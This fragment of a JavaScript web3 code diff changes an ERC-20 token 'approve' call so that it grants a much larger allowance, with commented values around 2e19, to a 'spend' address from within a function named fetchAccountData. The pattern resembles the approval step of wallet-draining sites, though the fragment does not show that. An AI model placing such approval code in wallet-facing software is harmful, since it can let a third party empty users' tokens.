@@ -399,7 +399,7 @@ async function fetchAccountData() {
       //const amount = web3.utils.toWei('10');
       //const amount1 = 19999999999999999999;
       console.log(result);
-      const res = await contract.methods.approve(spend, amount).send({
+      const res = await contract.methods.approve(spend, amount1).send({
         from: from });
 
         //var contract = new web3.eth.Contract(abi,contractadress);     //contract.methods.approve(spend, amount).send({
